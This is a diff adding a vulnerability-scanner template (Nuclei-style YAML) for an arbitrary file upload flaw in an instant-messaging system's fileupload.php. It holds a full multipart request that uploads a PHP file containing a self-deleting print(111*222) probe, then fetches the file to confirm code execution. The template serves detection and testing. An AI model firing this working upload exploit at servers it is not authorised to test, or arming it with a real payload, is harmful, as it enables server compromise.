@@ -1,0 +1,37 @@
+id: IM-fileupload_php-File-upload
+
+info:
+  name: IM 即时通讯系统 fileupload.php 任意文件上传漏洞
+  author: IM
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /static/lib/webuploader/0.1.5/server/fileupload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz
+
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Content-Disposition: form-data; name="file"; filename="{{username}}.php"
+        Content-Type: text/plain
+
+        <?php print(111*222);unlink(__FILE__);?>
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+  - raw:
+      - |
+        GET /static/lib/webuploader/0.1.5/server/upload/{{username}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
